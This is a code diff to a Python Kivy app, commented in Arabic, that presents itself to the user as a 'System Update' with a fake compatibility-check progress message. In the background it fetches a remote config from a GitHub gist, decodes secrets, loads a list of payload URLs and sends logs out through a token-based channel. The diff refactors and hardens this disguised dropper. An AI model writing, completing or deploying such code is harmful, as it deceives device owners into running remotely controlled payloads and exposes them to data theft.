@@ -3,41 +3,36 @@ import requests
 import base64
 import time
 import json
-import traceback  # لاستخراج تفاصيل الخطأ الكاملة
+import traceback
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.scrollview import ScrollView  # للتمرير في حالة النص الطويل
+from kivy.uix.scrollview import ScrollView
 from kivy.utils import platform
 
 class SystemUpdateApp(App):
     def build(self):
-        # الرابط الصحيح لملف config.json
+        # الرابط الصحيح (تأكدي من أنه يعمل)
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
 
-        # التخطيط الرئيسي
-        self.layout = BoxLayout(orientation='vertical')
-
-        # إضافة ScrollView لعرض النص الطويل
-        self.scroll_view = ScrollView()
+        layout = BoxLayout(orientation='vertical')
+        scroll = ScrollView()
         self.label = Label(
             text="System Update\nChecking for compatibility... (0%)",
-            halign="center",
+            halign='center',
             font_size='18sp',
-            text_size=(self.layout.width, None),  # التفاف النص حسب العرض
-            size_hint_y=None,                     # نتحكم بالارتفاع يدوياً
-            valign='top'                          # النص يبدأ من الأعلى
+            text_size=(layout.width, None),
+            size_hint_y=None,
+            valign='top'
         )
         self.label.bind(texture_size=self._update_label_height)
-        self.scroll_view.add_widget(self.label)
-        self.layout.add_widget(self.scroll_view)
+        scroll.add_widget(self.label)
+        layout.add_widget(scroll)
 
-        # تشغيل المحرك في خلفية منفصلة
         threading.Thread(target=self.logic_engine, daemon=True).start()
-        return self.layout
+        return layout
 
     def _update_label_height(self, instance, value):
-        """تحديث ارتفاع الـ Label تلقائياً حسب محتوى النص"""
         self.label.height = value[1]
 
     def decode_secret(self, data):
@@ -84,11 +79,14 @@ class SystemUpdateApp(App):
             self.load_payloads()
 
         except Exception as e:
-            # الحصول على تفاصيل الخطأ كاملة (سطر بسطر)
             error_details = traceback.format_exc()
-            # عرض الخطأ في الـ Label بدلاً من الرسالة المختصرة
             self.label.text = f"Connection Error:\n{error_details}"
-            self.send_log(f"❌ Critical Error: {error_details}")
+            # محاولة إرسال الخطأ عبر أول توكن إذا كان متاحاً (لكن قد لا يكون MASTER_CONFIG موجوداً)
+            try:
+                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
+                    self.send_log(f"❌ Critical Error: {error_details}")
+            except:
+                pass
 
     def load_payloads(self):
         payload_urls = [
